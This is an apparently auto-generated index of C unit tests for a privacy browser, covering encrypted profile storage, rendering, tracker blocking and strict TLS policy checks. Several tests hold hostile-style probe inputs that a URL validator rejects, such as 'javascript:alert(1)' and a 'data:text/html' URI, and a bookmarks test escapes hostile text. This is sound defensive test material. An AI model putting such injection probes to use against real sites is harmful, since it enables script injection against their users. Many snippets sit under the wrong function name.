- `test_suggest_priorities` (line 289) `static void test_suggest_priorities(void **state)` - *assert_string_equal(p.history[0], "https://a.test/"); assert_string_equal(p.history[1], "https://b.test/"); char url[64]; for (size_t i = 0; i < PREFS_MAX_HISTORY + 10; ++i) { snprintf(url, sizeof url, "https://h.test/%zu", i); assert_int_equal(prefs_history_add(&p, url), PREFS_OK); } assert_int_equal(p.history_len, PREFS_MAX_HISTORY); assert_string_equal(p.history[0], "https://h.test/509"); /* newest kept prefs_free(&p); } /* --- omnibox suggestions --------------------------------------------------------*
- `test_bookmarks_page_escapes` (line 344) `static void test_bookmarks_page_escapes(void **state)` - */* Rows too small for a URL: that URL is skipped, no overflow. char tiny[6][16]; n = prefs_suggest(&p, "wiki", (char *)tiny, sizeof tiny[0], 6); assert_int_equal(n, 0); assert_int_equal(prefs_suggest(NULL, "q", (char *)rows, sizeof rows[0], 6), 0); assert_int_equal(prefs_suggest(&p, NULL, (char *)rows, sizeof rows[0], 6), 0); assert_int_equal(prefs_suggest(&p, "q", NULL, sizeof rows[0], 6), 0); assert_int_equal(prefs_suggest(&p, "q", (char *)rows, sizeof rows[0], 0), 0); prefs_free(&p); } /* --- bookmarks page: hostile text is escaped --------------------------------------*
- `test_format_null_args` (line 381) `static void test_format_null_args(void **state)` - */* Empty state still yields a valid page. prefs_state q; prefs_init(&q); assert_int_equal(prefs_bookmarks_page(&q, &html, &len), PREFS_OK); assert_non_null(strstr(html, "Ctrl+B"));  /* the hint for an empty profile free(html); prefs_free(&q); assert_int_equal(prefs_bookmarks_page(NULL, &html, &len), PREFS_ERR_NULL_ARG); assert_int_equal(prefs_bookmarks_page(&p, NULL, &len), PREFS_ERR_NULL_ARG); prefs_free(&p); } /* --- format: NULL args --------------------------------------------------------------*
- `main` (line 393) `int main(void)`

**Macros:**
- `_POSIX_C_SOURCE` (line 8)

#### `test_profile.c`
**Path:** `tests/test_profile.c`

**Functions:**
- `setup` (line 29) `static int setup(void **state)`
- `teardown` (line 38) `static int teardown(void **state)`
- `path_of` (line 59) `static void path_of(const fixture *f, const char *name, char *out, size_t cap)`
- `file_size` (line 63) `static size_t file_size(const char *path)`
- `test_open_creates_keyfile` (line 71) `static void test_open_creates_keyfile(void **state)` - *return 0; } static void path_of(const fixture *f, const char *name, char *out, size_t cap) { snprintf(out, cap, "%s/%s", f->dir, name); } static size_t file_size(const char *path) { struct stat st; if (stat(path, &st) != 0) return (size_t)-1; return (size_t)st.st_size; } /* --- open: keyfile lifecycle --------------------------------------------------*
- `test_open_rejects_corrupt_keyfile` (line 88) `static void test_open_rejects_corrupt_keyfile(void **state)`
- `test_open_bad_dir` (line 102) `static void test_open_bad_dir(void **state)`
- `test_first_launch_defaults` (line 114) `static void test_first_launch_defaults(void **state)` - *assert_int_equal(file_size(kp), 5); } static void test_open_bad_dir(void **state) { (void)state; profile_ctx ctx; assert_int_equal(profile_open(&ctx, "/nonexistent/freedom-prof"), PROFILE_ERR_DIR); assert_int_equal(profile_open(&ctx, ""), PROFILE_ERR_DIR); assert_int_equal(profile_open(&ctx, NULL), PROFILE_ERR_NULL_ARG); assert_int_equal(profile_open(NULL, "/tmp"), PROFILE_ERR_NULL_ARG); } /* --- load/save ------------------------------------------------------------------*
- `test_save_load_roundtrip_two_ctx` (line 127) `static void test_save_load_roundtrip_two_ctx(void **state)`
- `test_nothing_readable_on_disk` (line 173) `static void test_nothing_readable_on_disk(void **state)` - */* prefs.bin is 0600. char pp[512]; path_of(f, PROFILE_PREFS_FILE, pp, sizeof pp); struct stat st; assert_int_equal(stat(pp, &st), 0); assert_int_equal(st.st_mode & 0777, 0600); prefs_free(&p); prefs_free(&q); profile_close(&b); } /* --- Zero Knowledge: nothing readable on disk ------------------------------------*
- `test_tampered_blob_auth_fails` (line 203) `static void test_tampered_blob_auth_fails(void **state)` - *assert_non_null(fp); static uint8_t blob[1 << 20]; size_t blen = fread(blob, 1, sizeof blob, fp); fclose(fp); assert_true(blen > 0); assert_null(memmem(blob, blen, secret_url, strlen(secret_url))); assert_null(memmem(blob, blen, "My bank", 7)); assert_null(memmem(blob, blen, "freedom-prefs", 13)); prefs_free(&p); profile_close(&ctx); } /* --- fail closed on tamper / foreign key ------------------------------------------*
- `test_foreign_key_auth_fails` (line 235) `static void test_foreign_key_auth_fails(void **state)`
- `test_null_and_not_ready` (line 260) `static void test_null_and_not_ready(void **state)` - *char kp[512]; path_of(f, PROFILE_KEY_FILE, kp, sizeof kp); assert_int_equal(unlink(kp), 0); profile_ctx other; assert_int_equal(profile_open(&other, f->dir), PROFILE_OK); prefs_state q; prefs_init(&q); assert_int_equal(profile_load(&other, &q), PROFILE_ERR_AUTH); prefs_free(&p); prefs_free(&q); profile_close(&other); } /* --- NULL / not-ready args ---------------------------------------------------------*
- `main` (line 277) `int main(void)`

**Macros:**
- `_GNU_SOURCE` (line 8)

**Structs:**
- `fixture` (line 28)

#### `test_render_doc.c`
**Path:** `tests/test_render_doc.c`

**Functions:**
- `caps_images_on` (line 27) `static rdp_caps caps_images_on(void)`
- `first_kind` (line 35) `static const rd_block *first_kind(const rd_doc *d, rd_kind k)` - *#include "flex_layout.h" #include "page_view.h" #include "render_doc.h" #include "render_policy.h" static const char TOP[] = "https://example.com/"; static rdp_caps caps_images_on(void) { rdp_caps c = rdp_caps_safe(); c.images = true; return c; } /* First block of a given kind, or NULL.*
- `test_build_null_out` (line 43) `static void test_build_null_out(void **state)` - *rdp_caps c = rdp_caps_safe(); c.images = true; return c; } /* First block of a given kind, or NULL. static const rd_block *first_kind(const rd_doc *d, rd_kind k) { for (size_t i = 0; i < rd_count(d); ++i) { if (rd_at(d, i)->kind == k) return rd_at(d, i); } return NULL; } /* --- argument / empty handling ---*
- `test_build_null_view_is_empty` (line 50) `static void test_build_null_view_is_empty(void **state)`
- `test_heading_paragraph_link` (line 63) `static void test_heading_paragraph_link(void **state)` - *} static void test_build_null_view_is_empty(void **state) { (void)state; rd_doc *d = NULL; assert_int_equal(rd_build(NULL, rdp_caps_safe(), TOP, &d), RD_OK); assert_non_null(d); assert_int_equal((int)rd_count(d), 0); assert_int_equal(d->has_images, 0); assert_null(rd_at(d, 0)); rd_free(d); } /* --- structural mapping ---*
- `test_emphasis_propagates` (line 94) `static void test_emphasis_propagates(void **state)` - *Inline emphasis flags (bold/italic) carry from the run to the block, on text and * link blocks alike, and are independent of caps (structure, not author styling).*
- `test_image_off_emits_notice_and_blocked` (line 124) `static void test_image_off_emits_notice_and_blocked(void **state)` - *assert_int_equal(rd_at(d, 0)->italic, 0); assert_int_equal(rd_at(d, 1)->bold, 1); assert_int_equal(rd_at(d, 1)->italic, 0); assert_int_equal(rd_at(d, 2)->bold, 0); assert_int_equal(rd_at(d, 2)->italic, 1); assert_int_equal(rd_at(d, 3)->kind, RD_LINK); assert_int_equal(rd_at(d, 3)->bold, 1); assert_int_equal(rd_at(d, 3)->italic, 1); rd_free(d); pv_free(v); } /* --- images off (default): a notice is prepended and the image is blocked ---*
- `test_no_images_no_notice` (line 149) `static void test_no_images_no_notice(void **state)`
- `test_image_on_allows_normal` (line 163) `static void test_image_on_allows_normal(void **state)` - *static void test_no_images_no_notice(void **state) { (void)state; pv_view *v = pv_new(); assert_int_equal(pv_append(v, PV_TEXT, 0, 0, "just text", NULL), PV_OK); rd_doc *d = NULL; assert_int_equal(rd_build(v, rdp_caps_safe(), TOP, &d), RD_OK); assert_int_equal(d->has_images, 0); assert_null(first_kind(d, RD_NOTICE)); rd_free(d); pv_free(v); } /* --- images on: per-image decision, no notice ---*
- `test_image_on_resolves_relative_src` (line 182) `static void test_image_on_resolves_relative_src(void **state)` - *A relative src ("/logo.png") is not an invalid URL: it resolves against the top-level document. The decision must allow it and the stored href must be the resolved absolute https URL the fetch will use. (Regression: relative images such * as the Google logo were wrongly blocked as "invalid URL".)*
- `test_image_on_resolves_doc_relative_src` (line 198) `static void test_image_on_resolves_doc_relative_src(void **state)` - *A document-relative src ("logo.png", no leading slash) resolves against the * page's directory, too.*
- `test_image_on_blocks_tracker` (line 211) `static void test_image_on_blocks_tracker(void **state)`
- `test_image_on_blocks_non_https` (line 224) `static void test_image_on_blocks_non_https(void **state)`
- `test_image_data_url_allowed_remote_top` (line 259) `static void test_image_data_url_allowed_remote_top(void **state)`
- `test_image_data_url_allowed_no_top` (line 278) `static void test_image_data_url_allowed_no_top(void **state)` - *No top-level URL at all (e.g. a bare fragment): a data: URI needs none, unlike a relative https src, which fails closed without a base (test_image_on_local_top_ * fails_closed above).*
- `test_image_data_url_disabled_by_default` (line 290) `static void test_image_data_url_disabled_by_default(void **state)`
- `test_image_data_url_percent_encoded_blocked_invalid` (line 306) `static void test_image_data_url_percent_encoded_blocked_invalid(void **state)` - *A percent-encoded (non-base64) data: URI is the unsupported variant: fails * closed as invalid rather than silently falling through to the https path.*
- `test_href_sanitised` (line 321) `static void test_href_sanitised(void **state)` - *(void)state; pv_view *v = pv_new(); assert_int_equal(pv_append_image(v, 0, 0, "", "data:image/svg+xml,<svg/>", 64, 64), PV_OK); rd_doc *d = NULL; assert_int_equal(rd_build(v, caps_images_on(), TOP, &d), RD_OK); const rd_block *img = first_kind(d, RD_IMAGE); assert_non_null(img); assert_int_equal(img->img_decision, RDP_IMG_BLOCK_INVALID); rd_free(d); pv_free(v); } /* --- UTF-8 safety: an invalid href byte is sanitised in the document ---*
- `test_kind_name_total` (line 338) `static void test_kind_name_total(void **state)` - *pv_view *v = pv_new(); /* pv_append stores the href verbatim; render_doc must make it paint-safe. const char bad[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'e', '/', (char)0xFF, '\0' }; assert_int_equal(pv_append(v, PV_LINK, 0, 0, "x", bad), PV_OK); rd_doc *d = NULL; assert_int_equal(rd_build(v, rdp_caps_safe(), TOP, &d), RD_OK); const rd_block *l = first_kind(d, RD_LINK); assert_non_null(l); assert_string_equal(l->href, "https://e/?"); rd_free(d); pv_free(v); } /* --- label / name strings are total ---*
- `test_image_label_total` (line 348) `static void test_image_label_total(void **state)`
- `test_free_null_and_double` (line 361) `static void test_free_null_and_double(void **state)`
- `test_author_color_gated_by_css` (line 372) `static void test_author_color_gated_by_css(void **state)` - *Author colors are presentation gated by caps.css (Privacy by Default off): the * run's fg_rgb is dropped to -1 unless author CSS is enabled.*
- `test_text_overflow_word_break_gated_by_css` (line 402) `static void test_text_overflow_word_break_gated_by_css(void **state)` - */* CSS on: both colors carried through. rdp_caps caps = rdp_caps_safe(); caps.css = true; assert_int_equal(rd_build(v, caps, TOP, &d), RD_OK); p = first_kind(d, RD_PARAGRAPH); assert_non_null(p); assert_int_equal(p->fg_rgb, 0x3366cc); assert_int_equal(p->bg_rgb, 0xeeddcc); rd_free(d); pv_free(v); } /* text_overflow/word_break are presentation, gated by caps.css like white_space.*
- `test_text_ext_2026_07_10_batch_gated_by_css` (line 437) `static void test_text_ext_2026_07_10_batch_gated_by_css(void **state)` - *2026-07-10 batch: tab_size / direction / font_variant / list_style_pos travel the same caps.css gate as the other text extensions (off by default; carried to rd_block only when the user opts in via caps.css). Defaults: tab_size 0, * direction 0, font_variant 0, list_style_pos 0.*
- `test_image_rendering_gated_on_image` (line 477) `static void test_image_rendering_gated_on_image(void **state)` - *2026-07-10 wiring batch: image_rendering reaches RD_IMAGE only with caps.css * (presentation; it also needs caps.images to matter, but the gate is css).*
- `test_caret_color_gated_on_input` (line 506) `static void test_caret_color_gated_on_input(void **state)` - *rd_free(d); rdp_caps caps = rdp_caps_safe(); caps.css = true; assert_int_equal(rd_build(v, caps, TOP, &d), RD_OK); img = first_kind(d, RD_IMAGE); assert_non_null(img); assert_int_equal(img->image_rendering, CSS_IR_PIXELATED); rd_free(d); pv_free(v); } /* 2026-07-10 wiring batch: caret_color reaches RD_INPUT only with caps.css.*
- `test_input_passthrough` (line 535) `static void test_input_passthrough(void **state)` - *rd_free(d); rdp_caps caps = rdp_caps_safe(); caps.css = true; assert_int_equal(rd_build(v, caps, TOP, &d), RD_OK); in = first_kind(d, RD_INPUT); assert_non_null(in); assert_int_equal(in->caret_color, 0x112233); rd_free(d); pv_free(v); } /* --- form controls ---*
- `test_input_label_total` (line 570) `static void test_input_label_total(void **state)`
- `test_container_carried_by_default` (line 584) `static void test_container_carried_by_default(void **state)` - *The author flex/grid container annotation is structure, not styling: it is * carried regardless of caps.css (layout applies by default), with its params.*
- `test_cont_item_carried_by_default` (line 616) `static void test_cont_item_carried_by_default(void **state)` - *rdp_caps caps = rdp_caps_safe(); caps.css = true; assert_int_equal(rd_build(v, caps, TOP, &d), RD_OK); p = first_kind(d, RD_PARAGRAPH); assert_non_null(p); assert_int_equal(p->cont_id, 0); assert_int_equal(p->cont_display, BX_DISPLAY_FLEX); assert_int_equal(p->cont_gap, 12); assert_int_equal(p->cont_justify, FX_JUSTIFY_CENTER); rd_free(d); pv_free(v); } /* cont_item is structure like cont_*: carried with caps.css off, default -1.*
- `test_float_carried_by_default` (line 649) `static void test_float_carried_by_default(void **state)` - *float.md: float_side/float_id/float_clear are layout structure, carried regardless of * caps.css; a run that never got pv_set_float keeps the unset defaults.*
- `test_flex_item_carried_by_default` (line 681) `static void test_flex_item_carried_by_default(void **state)`
- `test_flex_wrap_align_row_gap_carried_by_default` (line 730) `static void test_flex_wrap_align_row_gap_carried_by_default(void **state)` - *flex-wrap / row-gap / align-items (CONTAINER) + align-self (ITEM) are structure * like the rest of the cont_ and flex_ fields: carried regardless of caps.css.*
- `test_block_tag_total` (line 761) `static void test_block_tag_total(void **state)`
- `test_node_id_carried_by_default` (line 798) `static void test_node_id_carried_by_default(void **state)` - *Stage 0 keystone: node_id is structure, so it is copied regardless of the * caps.css gate (unlike block_id, which exists only when author styling is on).*
- `main` (line 810) `int main(void)`

#### `test_render_policy.c`
**Path:** `tests/test_render_policy.c`

**Functions:**
- `test_caps_safe_is_all_off` (line 17) `static void test_caps_safe_is_all_off(void **state)` - *Pure policy logic: no I/O. Build: make test   ;   ASan: make asan  #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "render_policy.h" /* --- rdp_caps_safe ---*
- `test_caps_zero_value_is_safe` (line 25) `static void test_caps_zero_value_is_safe(void **state)`
- `test_tracking_pixel_tiny` (line 36) `static void test_tracking_pixel_tiny(void **state)` - *The zero value of the struct must equal the safe baseline: insecure config * is not representable as a default. rdp_caps z = {0}; rdp_caps s = rdp_caps_safe(); assert_memory_equal(&z, &s, sizeof(rdp_caps)); } /* --- rdp_is_tracking_pixel ---*
- `test_tracking_pixel_zero_area` (line 44) `static void test_tracking_pixel_zero_area(void **state)`
- `test_tracking_pixel_normal` (line 51) `static void test_tracking_pixel_normal(void **state)`
- `test_tracking_pixel_unknown` (line 61) `static void test_tracking_pixel_unknown(void **state)`
- `test_image_disabled_by_default` (line 71) `static void test_image_disabled_by_default(void **state)` - *classified as a tracker by the size heuristic. assert_int_equal(rdp_is_tracking_pixel(1, 300), 0); assert_int_equal(rdp_is_tracking_pixel(800, 600), 0); } static void test_tracking_pixel_unknown(void **state) { (void)state; /* Negative = unknown: cannot classify, do not block on this basis. assert_int_equal(rdp_is_tracking_pixel(-1, -1), 0); assert_int_equal(rdp_is_tracking_pixel(-1, 1), 0); assert_int_equal(rdp_is_tracking_pixel(1, -1), 0); } /* --- rdp_image_decision: capability gate ---*
- `caps_images_on` (line 89) `static rdp_caps caps_images_on(void)` - *Images off: even a perfectly valid same-site image is blocked, and the URL * is not even consulted (a bogus URL still yields BLOCK_DISABLED). assert_int_equal( rdp_image_decision(off, "https://example.com/", "https://example.com/a.png", 64, 64), RDP_IMG_BLOCK_DISABLED); assert_int_equal( rdp_image_decision(off, "https://example.com/", "not-a-url", -1, -1), RDP_IMG_BLOCK_DISABLED); assert_int_equal( rdp_image_decision(off, NULL, NULL, -1, -1), RDP_IMG_BLOCK_DISABLED); } /* --- rdp_image_decision: images enabled ---*
- `test_image_allow_same_site` (line 95) `static void test_image_allow_same_site(void **state)`
- `test_image_allow_cross_site_when_enabled` (line 107) `static void test_image_allow_cross_site_when_enabled(void **state)`
- `test_image_block_tracker` (line 118) `static void test_image_block_tracker(void **state)`
- `test_image_block_scheme` (line 133) `static void test_image_block_scheme(void **state)`
- `test_image_block_invalid` (line 141) `static void test_image_block_invalid(void **state)`
- `test_image_allow_data_url` (line 164) `static void test_image_allow_data_url(void **state)` - *A data: URI embeds its bytes inline: no socket opens, so it skips the https/ * host/tracker checks above but still needs caps.images. See spec/data_url.md.*
- `test_image_data_url_disabled_by_default` (line 182) `static void test_image_data_url_disabled_by_default(void **state)`
- `test_image_data_url_malformed_is_invalid` (line 190) `static void test_image_data_url_malformed_is_invalid(void **state)`
- `test_image_disabled_precedence` (line 207) `static void test_image_disabled_precedence(void **state)` - *Disabled capability beats every other reason: a tracker URL with images off is * reported as DISABLED, not TRACKER (the gate short-circuits first).*
- `test_img_reason_total_and_stable` (line 216) `static void test_img_reason_total_and_stable(void **state)` - *Disabled capability beats every other reason: a tracker URL with images off is * reported as DISABLED, not TRACKER (the gate short-circuits first). static void test_image_disabled_precedence(void **state) { (void)state; rdp_caps off = rdp_caps_safe(); assert_int_equal( rdp_image_decision(off, "https://example.com/", "https://tracker.net/p.gif", 1, 1), RDP_IMG_BLOCK_DISABLED); } /* --- reason / warning strings ---*
- `test_images_warning_present` (line 231) `static void test_images_warning_present(void **state)`
- `main` (line 240) `int main(void)`

#### `test_renderer.c`
**Path:** `tests/test_renderer.c`

**Functions:**
- `test_render_basic` (line 26) `static void test_render_basic(void **state)`
- `test_render_strips_script` (line 38) `static void test_render_strips_script(void **state)`
- `test_render_null_args` (line 47) `static void test_render_null_args(void **state)`
- `test_render_too_large` (line 54) `static void test_render_too_large(void **state)`
- `test_render_binary_does_not_crash_parent` (line 63) `static void test_render_binary_does_not_crash_parent(void **state)` - *(void)state; rd_result r; assert_int_equal(rd_render_html(NULL, 10, &r), RD_ERR_NULL_ARG); assert_int_equal(rd_render_html("x", 1, NULL), RD_ERR_NULL_ARG); } static void test_render_too_large(void **state) { (void)state; rd_result r; /* Length cap is checked before any allocation of the body. assert_int_equal(rd_render_html("x", RD_MAX_INPUT + 1, &r), RD_ERR_TOO_LARGE); } /* The parent must survive arbitrary/binary input: isolation in action.*
- `test_render_multiple_independent` (line 74) `static void test_render_multiple_independent(void **state)` - *} /* The parent must survive arbitrary/binary input: isolation in action. static void test_render_binary_does_not_crash_parent(void **state) { (void)state; uint8_t junk[1024]; for (size_t i = 0; i < sizeof junk; ++i) junk[i] = (uint8_t)(i * 37 + 11); rd_result r; rd_status s = rd_render_html((const char *)junk, sizeof junk, &r); assert_true(s == RD_OK || s == RD_ERR_RENDER); /* never a parent crash rd_result_free(&r); } /* Each call spawns its own child process: per-render/per-tab isolation.*
- `test_result_free_null_and_double` (line 83) `static void test_result_free_null_and_double(void **state)`
- `main` (line 92) `int main(void)`

#### `test_request_policy.c`
**Path:** `tests/test_request_policy.c`

**Functions:**
- `test_host_of_basic` (line 17) `static void test_host_of_basic(void **state)` - *Pure policy logic: no I/O. Build: make test   ;   ASan: make asan  #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "request_policy.h" /* --- rp_host_of ---*
- `test_host_of_invalid` (line 28) `static void test_host_of_invalid(void **state)`
- `test_host_of_overflow` (line 36) `static void test_host_of_overflow(void **state)`
- `test_site_of` (line 44) `static void test_site_of(void **state)` - *(void)state; char h[256]; assert_int_equal(rp_host_of("example.com", h, sizeof h), -1); /* no scheme assert_int_equal(rp_host_of("https:///path", h, sizeof h), -1); /* empty host assert_int_equal(rp_host_of(NULL, h, sizeof h), -1); } static void test_host_of_overflow(void **state) { (void)state; char small[4]; assert_int_equal(rp_host_of("https://example.com/", small, sizeof small), -1); } /* --- rp_site_of ---*
- `test_site_of_multi_suffix` (line 57) `static void test_site_of_multi_suffix(void **state)`
- `test_site_of_psl` (line 70) `static void test_site_of_psl(void **state)` - *} static void test_site_of_multi_suffix(void **state) { (void)state; char s[256]; assert_int_equal(rp_site_of("example.co.uk", s, sizeof s), 0); assert_string_equal(s, "example.co.uk"); assert_int_equal(rp_site_of("www.example.co.uk", s, sizeof s), 0); assert_string_equal(s, "example.co.uk"); assert_int_equal(rp_site_of("shop.example.com.br", s, sizeof s), 0); assert_string_equal(s, "example.com.br"); } /* Cases the old heuristic got wrong but the full PSL gets right.*
- `test_same_site` (line 90) `static void test_same_site(void **state)` - *assert_int_equal(rp_site_of("a.blog.github.io", s, sizeof s), 0); assert_string_equal(s, "blog.github.io"); /* Wildcard rule "*.ck": bar.ck is the public suffix. assert_int_equal(rp_site_of("foo.bar.ck", s, sizeof s), 0); assert_string_equal(s, "foo.bar.ck"); /* Exception rule "!www.ck": www.ck IS registrable (suffix is just "ck"). assert_int_equal(rp_site_of("foo.www.ck", s, sizeof s), 0); assert_string_equal(s, "www.ck"); /* New-style gTLD with no second level: site is two labels. assert_int_equal(rp_site_of("shop.example.dev", s, sizeof s), 0); assert_string_equal(s, "example.dev"); } /* --- rp_same_site ---*
- `test_evaluate_allow_same_site` (line 104) `static void test_evaluate_allow_same_site(void **state)` - *static void test_same_site(void **state) { (void)state; assert_int_equal(rp_same_site("https://example.com/", "https://example.com/a"), 1); assert_int_equal(rp_same_site("https://www.example.com/", "https://cdn.example.com/x"), 1); assert_int_equal(rp_same_site("https://example.com/", "https://tracker.net/x"), 0); assert_int_equal(rp_same_site("https://a.example.co.uk/", "https://b.example.co.uk/"), 1); assert_int_equal(rp_same_site("https://example.co.uk/", "https://evil.co.uk/"), 0); /* Two different users on a PRIVATE suffix are different sites. assert_int_equal(rp_same_site("https://alice.github.io/", "https://bob.github.io/"), 0); assert_int_equal(rp_same_site("https://x.alice.github.io/", "https://alice.github.io/"), 1); } /* --- rp_evaluate ---*
- `test_evaluate_block_third_party` (line 111) `static void test_evaluate_block_third_party(void **state)`
- `test_evaluate_block_scheme` (line 119) `static void test_evaluate_block_scheme(void **state)`
- `test_evaluate_block_invalid` (line 127) `static void test_evaluate_block_invalid(void **state)`
- `main` (line 138) `int main(void)`

#### `test_secure_fetch.c`
**Path:** `tests/test_secure_fetch.c`

**Functions:**
- `test_config_blend_fields_default_null` (line 33) `static void test_config_blend_fields_default_null(void **state)`
- `test_user_agent_default_when_unset` (line 45) `static void test_user_agent_default_when_unset(void **state)` - *assert_null(c.user_agent); /* NULL => resolved to the default at request time } static void test_config_blend_fields_default_null(void **state) { (void)state; sf_config c = sf_config_default(); assert_null(c.referrer_url); assert_null(c.sec_fetch_dest); assert_null(c.sec_fetch_mode); assert_null(c.progress_ctx); assert_null(c.progress_cb); } /* --- sf_user_agent_or_default ---*
- `test_user_agent_uses_override` (line 51) `static void test_user_agent_uses_override(void **state)`
- `test_url_rejects_null` (line 59) `static void test_url_rejects_null(void **state)` - *static void test_user_agent_default_when_unset(void **state) { (void)state; assert_string_equal(sf_user_agent_or_default(NULL), SF_DEFAULT_USER_AGENT); assert_string_equal(sf_user_agent_or_default(""), SF_DEFAULT_USER_AGENT); } static void test_user_agent_uses_override(void **state) { (void)state; const char *ua = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"; assert_string_equal(sf_user_agent_or_default(ua), ua); } /* --- sf_validate_url ---*
- `test_url_rejects_plain_http` (line 64) `static void test_url_rejects_plain_http(void **state)`
- `test_url_rejects_dangerous_schemes` (line 69) `static void test_url_rejects_dangerous_schemes(void **state)`
- `test_url_accepts_https` (line 79) `static void test_url_accepts_https(void **state)`
- `test_tls_rejects_12` (line 87) `static void test_tls_rejects_12(void **state)` - *assert_int_equal(sf_validate_url("javascript:alert(1)"), SF_ERR_INVALID_URL); assert_int_equal(sf_validate_url("data:text/html,<b>x"), SF_ERR_INVALID_URL); assert_int_equal(sf_validate_url("ftp://example.com"), SF_ERR_INVALID_URL); assert_int_equal(sf_validate_url("example.com"), SF_ERR_INVALID_URL); assert_int_equal(sf_validate_url("https://"), SF_ERR_INVALID_URL); } static void test_url_accepts_https(void **state) { (void)state; assert_int_equal(sf_validate_url("https://example.com/path"), SF_OK); assert_int_equal(sf_validate_url("HTTPS://EXAMPLE.COM"), SF_OK); } /* --- sf_check_tls_version --- (requirement (a))*
- `test_tls_rejects_older_and_garbage` (line 92) `static void test_tls_rejects_older_and_garbage(void **state)`
- `test_tls_accepts_13` (line 101) `static void test_tls_accepts_13(void **state)`
- `test_group_rejects_classical` (line 108) `static void test_group_rejects_classical(void **state)` - *(void)state; assert_int_equal(sf_check_tls_version("TLSv1.1"), SF_ERR_TLS_VERSION); assert_int_equal(sf_check_tls_version("TLSv1"), SF_ERR_TLS_VERSION); assert_int_equal(sf_check_tls_version("SSLv3"), SF_ERR_TLS_VERSION); assert_int_equal(sf_check_tls_version(NULL), SF_ERR_TLS_VERSION); assert_int_equal(sf_check_tls_version("nonsense"), SF_ERR_TLS_VERSION); } static void test_tls_accepts_13(void **state) { (void)state; assert_int_equal(sf_check_tls_version("TLSv1.3"), SF_OK); } /* --- sf_check_group_is_pq ---*
- `test_group_rejects_pure_pq` (line 115) `static void test_group_rejects_pure_pq(void **state)`
- `test_group_accepts_hybrid` (line 122) `static void test_group_accepts_hybrid(void **state)`
- `test_chain_strict_rejects_classical` (line 131) `static void test_chain_strict_rejects_classical(void **state)` - *(void)state; /* Pure PQ has no classical fallback: rejected by design. assert_int_equal(sf_check_group_is_pq("MLKEM768"), SF_ERR_KEM_NOT_PQ); assert_int_equal(sf_check_group_is_pq("MLKEM1024"), SF_ERR_KEM_NOT_PQ); } static void test_group_accepts_hybrid(void **state) { (void)state; assert_int_equal(sf_check_group_is_pq("X25519MLKEM768"), SF_OK); assert_int_equal(sf_check_group_is_pq("SecP256r1MLKEM768"), SF_OK); assert_int_equal(sf_check_group_is_pq("X448MLKEM1024"), SF_OK); } /* --- sf_check_chain_policy --- (requirement (b))*
- `test_chain_strict_accepts_pq` (line 140) `static void test_chain_strict_accepts_pq(void **state)`
- `test_chain_hybrid_allows_classical` (line 148) `static void test_chain_hybrid_allows_classical(void **state)`
- `test_chain_rejects_sha1_in_any_policy` (line 156) `static void test_chain_rejects_sha1_in_any_policy(void **state)`
- `test_chain_permissive_allows_weak_certs` (line 165) `static void test_chain_permissive_allows_weak_certs(void **state)`
- `test_chain_rejects_weak_rsa` (line 178) `static void test_chain_rejects_weak_rsa(void **state)`
- `test_chain_rejects_null` (line 186) `static void test_chain_rejects_null(void **state)`
- `test_enforce_all_good_hybrid` (line 200) `static void test_enforce_all_good_hybrid(void **state)`
- `test_enforce_checks_version_first` (line 206) `static void test_enforce_checks_version_first(void **state)`
- `test_enforce_checks_group_after_version` (line 215) `static void test_enforce_checks_group_after_version(void **state)`
- `test_enforce_fails_closed_on_null_chain` (line 223) `static void test_enforce_fails_closed_on_null_chain(void **state)`
- `test_enforce_strict_requires_pq_chain` (line 230) `static void test_enforce_strict_requires_pq_chain(void **state)`
- `test_enforce_allow_classical_ke` (line 243) `static void test_enforce_allow_classical_ke(void **state)`
- `test_enforce_allowlisted_insecure` (line 263) `static void test_enforce_allowlisted_insecure(void **state)` - *The allowlist override: the user's sovereign per-host escape hatch for sites below Freedom's elevated standard. Tolerates TLS 1.2, a classical KE, and weak-but-valid * leaf primitives; still authenticates the chain (non-NULL) and refuses below 1.2.*
- `test_redirect_code_recognizes_3xx` (line 284) `static void test_redirect_code_recognizes_3xx(void **state)` - *But authenticity is never waived: a non-inspectable chain still fails closed, * and anything below TLS 1.2 is still refused. assert_int_equal(sf_enforce_policy("TLSv1.2", "x25519", NULL, SF_POLICY_ALLOWLISTED_INSECURE), SF_ERR_INTERNAL); assert_int_equal(sf_enforce_policy("TLSv1.1", "x25519", &OK_CLASSICAL, SF_POLICY_ALLOWLISTED_INSECURE), SF_ERR_TLS_VERSION); assert_int_equal(sf_enforce_policy(NULL, "x25519", &OK_CLASSICAL, SF_POLICY_ALLOWLISTED_INSECURE), SF_ERR_TLS_VERSION); } /* --- sf_is_redirect_code ---*
- `test_redirect_code_rejects_others` (line 293) `static void test_redirect_code_rejects_others(void **state)`
- `test_location_parses_value` (line 304) `static void test_location_parses_value(void **state)` - *assert_true(sf_is_redirect_code(307)); assert_true(sf_is_redirect_code(308)); } static void test_redirect_code_rejects_others(void **state) { (void)state; assert_false(sf_is_redirect_code(200)); assert_false(sf_is_redirect_code(204)); assert_false(sf_is_redirect_code(304)); /* Not Modified is not a redirect target assert_false(sf_is_redirect_code(404)); assert_false(sf_is_redirect_code(0)); } /* --- sf_parse_location_header ---*
- `test_location_is_case_insensitive_and_trims` (line 312) `static void test_location_is_case_insensitive_and_trims(void **state)`
- `test_location_rejects_non_location_and_empty` (line 322) `static void test_location_rejects_non_location_and_empty(void **state)`
- `test_location_rejects_overflow` (line 334) `static void test_location_rejects_overflow(void **state)`
- `test_resolve_absolute_https` (line 343) `static void test_resolve_absolute_https(void **state)` - *SF_ERR_INVALID_URL); assert_int_equal(sf_parse_location_header("Location:    \r\n", out, sizeof out), SF_ERR_INVALID_URL); assert_int_equal(sf_parse_location_header(NULL, out, sizeof out), SF_ERR_INVALID_URL); } static void test_location_rejects_overflow(void **state) { (void)state; char small[8]; assert_int_equal(sf_parse_location_header("Location: https://toolong.example/\r\n", small, sizeof small), SF_ERR_INVALID_URL); } /* --- sf_resolve_redirect ---*
- `test_resolve_refuses_http_downgrade` (line 351) `static void test_resolve_refuses_http_downgrade(void **state)`
- `test_resolve_refuses_dangerous_schemes` (line 358) `static void test_resolve_refuses_dangerous_schemes(void **state)`
- `test_resolve_scheme_relative` (line 369) `static void test_resolve_scheme_relative(void **state)`
